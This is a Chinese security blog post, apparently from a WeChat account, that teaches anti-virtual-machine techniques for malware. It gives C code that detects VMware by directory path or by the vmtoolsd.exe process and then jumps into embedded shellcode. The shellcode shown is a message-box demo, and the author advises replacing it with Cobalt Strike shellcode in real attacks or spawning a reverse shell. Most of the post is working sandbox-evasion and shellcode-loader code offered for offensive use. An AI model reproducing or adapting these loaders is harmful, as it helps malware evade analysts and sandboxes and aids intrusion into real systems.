> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zLF8otaE4oDyBflG0pqqEQ)

![](https://mmbiz.qpic.cn/mmbiz_jpg/8miblt1VEWywiaJCkziaQLQSQrBa9qJFWQJzrIOpB7giayjMZrEkX7viaFTLRwGnsRUDcoS9jgnDUtiakRODpzeVTBZQ/640?wx_fmt=jpeg)

扫一扫关注公众号，长期致力于安全研究

**前言：本文主要讲解如何反虚拟机**

  

0x01 最常见的例子

**在软件逆向，病毒分析等等，许多恶意程序为了自己不被调试，都运用了反虚拟机技术。当程序在虚拟机中则运行失败，甚至执行其它结果 (PS: 比如反弹个 shell 回去~~)**  

  

0x02 根据文件路径

虚拟机一般有一个路径，如果这个路径存在，一般就是在虚拟机中

```
C:\Program Files\VMware
```

    既然已经知道了这个路径，那只需要判断路径是否存在即可，这里用到

PathIsDirectory 函数，这个函数判断目录是否存在。

    完整代码如下：  

           判断是否在虚拟机环境，如果在虚拟机环境执行 shellcode(我这里是弹窗，实战中换成 CS 的即可)，

```
#include <Windows.h>
#include "shlwapi.h"
char shellcode[] =
"\xfc\x68\x6a\x0a\x38\x1e\x68\x63\x89\xd1\x4f\x68\x32\x74\x91\x0c"
"\x8b\xf4\x8d\x7e\xf4\x33\xdb\xb7\x04\x2b\xe3\x66\xbb\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xd2\x64\x8b\x5a\x30\x8b\x4b\x0c\x8b"
"\x49\x1c\x8b\x09\x8b\x69\x08\xad\x3d\x6a\x0a\x38\x1e\x75\x05\x95"
"\xff\x57\xf8\x95\x60\x8b\x45\x3c\x8b\x4c\x05\x78\x03\xcd\x8b\x59"
"\x20\x03\xdd\x33\xff\x47\x8b\x34\xbb\x03\xf5\x99\x0f\xbe\x06\x3a"
"\xc4\x74\x08\xc1\xca\x07\x03\xd0\x46\xeb\xf1\x3b\x54\x24\x1c\x75"
"\xe4\x8b\x59\x24\x03\xdd\x66\x8b\x3c\x7b\x8b\x59\x1c\x03\xdd\x03"
"\x2c\xbb\x95\x5f\xab\x57\x61\x3d\x6a\x0a\x38\x1e\x75\xa9\x33\xdb"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6c\x8b\xc4\x53\x50\x50"
"\x53\xff\x57\xfc\x53\xff\x57\xf8";
#pragma comment(lib, "shlwapi.lib")
int _tmain(int argc, _TCHAR* argv[])
{
  if (PathIsDirectoryW(L"C:\\Program Files\\VMware")){
    __asm{
      lea eax, shellcode;
      push eax;
      ret;
    }

  }
  return 0;
}
```

    接下来在虚拟机中运行一下，成功执行 Shellcode

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyxiazokHxrPdZIFgZc5ic0lpZOmI8de7HteT8UhViaCoHjwq2vgibRB0SMtmXGC6CRHn2eTbQh2EibGyEQ/640?wx_fmt=png)

  

  

0x03 根据进程信息

在虚拟机中，常见的默认进程有 vmware.exe 或者 vmtoolsd.exe 等等，我们只需要找到最常见的进程名，来进行判断是否存在该进程名，如果存在就进行程序退出或者反弹 shell。  

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyxiazokHxrPdZIFgZc5ic0lpZZfqHhgVblS90NED8ZIRgibAHeU9HN12YscxAy4VXiaLFEMphL64hl7Dw/640?wx_fmt=png)

```
完整代码如下：通过进程遍历，来查找进程名为vmtoolsd.exe的程序
 DWORD ret = 0;  
    PROCESSENTRY32 pe32;  
    pe32.dwSize = sizeof(pe32);   
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);   
    if(hProcessSnap == INVALID_HANDLE_VALUE)   
    {   
        return FALSE;   
    }  
    BOOL bMore = Process32First(hProcessSnap, &pe32);   
    while(bMore)  
    {  
        if (strcmp(pe32.szExeFile, "vmtoolsd.exe")==0)  
        {  
            __asm{
              lea eax,shellcode;
              jmp eax;
            }
            return TRUE;  
        }  
        bMore = Process32Next(hProcessSnap, &pe32);   
    }  
    CloseHandle(hProcessSnap);
```

  

0x04 结尾

**其实反虚拟机的手段是多之又多，本文只是列了两个很常见例子。**

11111  

微信搜索关注 "安全族" 长期致力于安全研究

下方扫一下扫，即可关注

![](https://mmbiz.qpic.cn/mmbiz_jpg/8miblt1VEWywiaJCkziaQLQSQrBa9qJFWQJzrIOpB7giayjMZrEkX7viaFTLRwGnsRUDcoS9jgnDUtiakRODpzeVTBZQ/640?wx_fmt=jpeg)